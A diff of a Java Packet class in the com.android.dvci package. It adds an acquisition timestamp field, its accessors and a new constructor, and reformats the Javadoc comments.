@@ -9,30 +9,42 @@
 
 package com.android.dvci;
 
-import java.util.ArrayList;
-
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.util.Utils;
+
+import java.util.ArrayList;
+import java.util.Date;
 
 /**
  * The Class Packet.
  */
 public class Packet {
 
-	/** The type. */
+	private Date acquiredTime;
+	/**
+	 * The type.
+	 */
 	int type;
 
-	/** The command. */
+	/**
+	 * The command.
+	 */
 	private int command;
 
-	/** The id. */
+	/**
+	 * The id.
+	 */
 	private final long id;
 
-	/** The data. */
+	/**
+	 * The data.
+	 */
 	private byte[] data;
 
-	/** The data. */
+	/**
+	 * The data.
+	 */
 	private byte[] additional;
 
 	private ArrayList<byte[]> items;
@@ -41,9 +53,8 @@ public class Packet {
 
 	/**
 	 * Instantiates a new CREATE packet.
-	 * 
-	 * @param unique
-	 *            the unique
+	 *
+	 * @param unique the unique
 	 */
 	public Packet(final long unique) {
 		type = EvidenceType.NONE;
@@ -58,14 +69,16 @@ public class Packet {
 	public Packet() {
 		id = 0;
 		command = EvidenceBuilder.INTERRUPT;
+		this.acquiredTime = new Date();
 	}
 
-	public Packet(int evidenceType, byte[] additional, byte[] data) {
+	public Packet(int evidenceType, byte[] additional, byte[] content) {
 		type = evidenceType;
 		id = Utils.getRandom();
 		command = EvidenceBuilder.LOG_ATOMIC;
-		setData(data);
+		setData(content);
 		this.additional = additional;
+		this.acquiredTime = new Date();
 	}
 
 	public Packet(int evidenceType, ArrayList<byte[]> items) {
@@ -73,12 +86,21 @@ public class Packet {
 		id = Utils.getRandom();
 		command = EvidenceBuilder.LOG_ITEMS;
 		this.items = items;
+		this.acquiredTime = new Date();
+	}
 
+	public Packet(int evidenceType, byte[] additional, byte[] content, Date acquiredTime) {
+		type = evidenceType;
+		id = Utils.getRandom();
+		command = EvidenceBuilder.LOG_ATOMIC;
+		setData(content);
+		this.additional = additional;
+		this.acquiredTime = acquiredTime;
 	}
 
 	/**
 	 * Gets the id.
-	 * 
+	 *
 	 * @return the id
 	 */
 	public long getId() {
@@ -87,9 +109,8 @@ public class Packet {
 
 	/**
 	 * Sets the command.
-	 * 
-	 * @param c
-	 *            the new command
+	 *
+	 * @param c the new command
 	 */
 	public void setCommand(final int c) {
 		command = c;
@@ -97,7 +118,7 @@ public class Packet {
 
 	/**
 	 * Gets the command.
-	 * 
+	 *
 	 * @return the command
 	 */
 	public int getCommand() {
@@ -105,11 +126,11 @@ public class Packet {
 	}
 
 	// Needed only when sending LOG_CREATE
+
 	/**
 	 * Sets the type.
-	 * 
-	 * @param evidenceType
-	 *            the new type
+	 *
+	 * @param evidenceType the new type
 	 */
 	public void setType(final int evidenceType) {
 		type = evidenceType;
@@ -117,7 +138,7 @@ public class Packet {
 
 	/**
 	 * Gets the type.
-	 * 
+	 *
 	 * @return the type
 	 */
 	public int getType() {
@@ -126,9 +147,8 @@ public class Packet {
 
 	/**
 	 * Fill.
-	 * 
-	 * @param d
-	 *            the d
+	 *
+	 * @param d the d
 	 */
 	public void setData(final byte[] buffer) {
 		data = buffer;
@@ -141,9 +161,13 @@ public class Packet {
 
 	}
 
+	public Date getAcquiredTime() {
+		return acquiredTime;
+	}
+
 	/**
 	 * Peek.
-	 * 
+	 *
 	 * @return the byte[]
 	 */
 	public byte[] getData() {
@@ -153,10 +177,10 @@ public class Packet {
 	public int getDataLength() {
 		return dataLen;
 	}
-	
+
 	/**
 	 * Gets the additional.
-	 * 
+	 *
 	 * @return the additional
 	 */
 	public byte[] getAdditional() {
@@ -165,9 +189,8 @@ public class Packet {
 
 	/**
 	 * Sets the additional.
-	 * 
-	 * @param d
-	 *            the new additional
+	 *
+	 * @param d the new additional
 	 */
 	public void setAdditional(final byte[] d) {
 		additional = d;
@@ -176,5 +199,9 @@ public class Packet {
 	public ArrayList<byte[]> getItems() {
 
 		return items;
+	}
+
+	public void setTime(Date acquiredTime) {
+		this.acquiredTime = acquiredTime;
 	}
 }
